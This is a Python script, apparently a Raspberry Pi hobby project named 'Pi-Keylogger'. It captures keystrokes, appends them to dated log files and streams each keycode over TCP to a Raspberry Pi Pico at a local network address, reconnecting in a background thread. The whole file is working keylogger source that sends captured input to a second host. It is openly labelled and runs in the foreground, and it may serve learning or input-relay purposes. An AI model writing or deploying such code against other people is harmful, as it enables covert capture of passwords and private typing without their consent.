import getch
import socket
import time
import threading
import os

os.system("stty -ixon")  # Disable Ctrl+S flow control

def log(char, date):
    """Log keypresses to a file and send them over TCP."""
    keycode = ord(char)
    print(f"Logging and sending keycode {keycode}")
    send_key(char)

    if keycode == 5:
        exit()

    key_mappings = {
        13: "\n",
        127: "<Backspace>",
        218: "<Up>",
        217: "<Down>",
        216: "<Left>",
        215: "<Right>"
    }

    char = key_mappings.get(keycode, char)

    log_path = f"/home/rikka/Pi-Keylogger/log/{date}.txt"
    with open(log_path, "a+") as f:
        f.write(char)
        # f.flush()  # Ensures immediate writing

def arrow(char):
    """Convert arrow key escape sequences to keycodes."""
    arrow_mappings = {
        65: 218,  # Up Arrow
        67: 215,  # Right Arrow
        68: 216,  # Left Arrow
        66: 217   # Down Arrow
    }
    return arrow_mappings.get(ord(char))

PICO_IP = "192.168.36.30"  # Change if needed
PORT = 12345
sock = None  # Declare socket globally
lock = threading.Lock()  # Prevent concurrent socket access

def connect():
    """Try to establish a TCP connection to the Pico."""
    global sock
    while True:
        with lock:
            if sock is not None:
                sock.close()
                sock = None  # Ensure it's completely reset
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((PICO_IP, PORT))
                print(f"Connected to {PICO_IP}:{PORT}")
            except Exception as e:
                print(f"Failed to connect: {e}, retrying in 2s...")
                sock = None
        time.sleep(2)


def send_key(char):
    """Send a keypress to the Pico via TCP."""
    global sock
    with lock:
        if sock is None:
            return  # If disconnected, just return (don't block input)
        try:
            sock.sendall(f"{ord(char)}\n".encode())  # Send keycode as raw data
        except Exception as e:
            print(f"Error sending key {ord(char)}: {e}")
            sock.close()
            sock = None  # Mark socket as disconnected

# Start the reconnect thread
threading.Thread(target=connect, daemon=True).start()

date = time.strftime("%c").replace(" ", "-")
print(date)

with open(f"/home/rikka/Pi-Keylogger/log/{date}.txt", "w+") as f:
    f.write(f"Started at {date}\n")

print("Keylogger started!")

while True:
    try:
        char = getch.getch()
        if ord(char) == 27:  # Escape sequence (arrow keys, etc.)
            _char = getch.getch()
            if ord(_char) == 91:  # Arrow key indicator
                char = chr(arrow(getch.getch()))
                log(char, date)
            else:
                log(char, date)
                log(_char, date)
        else:
            log(char, date)
    except KeyboardInterrupt:
        print("Handled Ctrl+C")
        log(chr(3), date)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(0.1)

with lock:
    if sock:
        sock.close()
